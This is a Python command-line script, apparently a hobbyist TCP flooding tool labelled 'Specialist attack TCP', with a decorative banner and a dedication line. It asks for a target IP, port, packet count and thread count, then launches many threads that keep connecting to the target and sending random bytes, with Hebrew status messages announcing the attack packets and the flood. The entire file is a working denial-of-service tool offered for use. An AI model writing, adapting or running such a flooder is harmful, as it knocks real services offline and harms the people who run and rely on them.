# _*_ coding: utf-8 _*_
import os
import socket
import threading
import time
import random
import progressbar

# Colors
class bcolors:
    HEADER = '\e[95m'
    OKBLUE = '\e[94m'
    OKCYAN = '\e[96m'
    OKGREEN = '\e[92m'
    WARNING = '\e[93m'
    UNDERLINE = '\e[4m'
    PURPLE = '\033[97m'
    BOLD    = "\e[1m"
    BLACK   = "\e[30m"
    RED     = "\e[31m"
    GREEN   = "\e[32m"
    YELLOW  = "\e[33m"
    BLUE    = "\e[34m"
    MAGENTA = "\e[35m"
    CYAN    = "\e[36m"
    WHITE   = "\e[37m"

# CLEAR
os.system("clear")
print(" ")
print("\033[31m  © © ©© ©©        ©© © ©      ©© © ©          \033[0m")
print("\033[31m      ©©         ©©            ©©     ©           \033[0m")
print("\033[31m      ©©         ©©            ©©     ©           \033[0m")
print("\033[33m      ©©         ©©            ©© © ©            \033[0m")
print("\033[33m      @@           @@ @ @      @@             \033[0m")
print("\033[33m      °°           °° ° °      °°            \033[0m")
print("\033[33m       °              °        °              \033[0m")
print("                                                                             ")   
print("\033[32m   ©© © © ©   ©©            ©© ©           ©© ©       ©© © ©          \033[0m")
print("\033[32m   ©©         ©©          ©©      ©     ©©      ©     ©©     ©        \033[0m")
print("\033[32m   ©©         ©©         ©©        ©   ©©        ©    ©©      ©       \033[0m")
print("\033[32m   ©© © © ©   ©©         ©©        ©   ©©        ©    ©©      ©       \033[0m")
print("\033[32m   @@         @@          @@      @     @@      @     @@     @        \033[0m")
print("\033[32m   @@         ®® @ @ @       @@ @          @@ @       @@ @ @          \033[0m")
print("\033[32m   °°         °°  ° °        °°°           °° °       °° °            \033[0m")
print("\033[32m   °           °  °           °             °          °°             \033[0m")
print("\033[93m==================================≠==≠======≠≠============≠======= \033[0m")
print("\033[93m           U S E   T H I S  S C R I P T  W I S E L Y               \033[0m")
print("\033[93m                     Specialist attack TCP                         \033[0m")
print("\033[93m                           By: ZA'99                               \033[0m")
print("\033[93m                           ——oO0Oo——                               \033[0m")
print("\033[93m==================================================================\033[0m")
print("\033[94m————————————————————————⟩⟩⟩")
ip = str(input("\033[93m[\033[93m+\033[92m]                      ⟩⟩ IP Target : "))
print("\033[94m————————————————————————⟩⟩⟩")
port = int(input("\033[92m[\033[95m+\033[92m]                      ⟩⟩ Port : "))
print("\033[94m————————————————————————⟩⟩⟩")
packs = int(input("\033[92m[\033[95m+\033[92m]                      ⟩⟩ Packets{0} : "))
print("\033[94m————————————————————————⟩⟩⟩")
thread = int(input("\033[92m[\033[95m+\033[92m]                      ⟩⟩ Threads : "))
print("\033[94m————————————————————————⟩⟩⟩")
time.sleep(5),
print("\033[96m                         ⟩⟩  KUNFAY \033[0m "),
time.sleep(5),
print("\033[92m                         ⟩⟩  DEDICATED \033[0m "),
time.sleep(5),
print("\033[1m                         ⟩⟩  FOR \033[0m "),
time.sleep(5),
print("\033[97m                         ⟩⟩  P4L15T1N14N \033[0m "),
time.sleep(5),
print("\033[95m                         ⟩⟩  PEOPLE \033[0m "),
time.sleep(5),  
def animated_marker():
    widgets = ['\033[94m[\033[97m#\033[94m#\033[97mLoading: progressbar.AnimatedMarker()\033[0m']
    bar = progressbar.ProgressBar(widgets=widgets).start()
      
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
          
animated_marker()

def start():
  r = random._urandom(10)
  u = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(r)
      for i in range(packs):
        s.send(r)
        u += 1
        print("\033[92m[🌠\033[92m] \033[33mtcpלְהַצִיף \033[32m " +str(u)+ " \033[32mשלח חבילות התקפה \033[37m  " +ip+ "  \033[0m")
        
    except:
        s.close()
        print("\033[97m[💥\033[97m]\033[35mמציפים למטה")

for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()
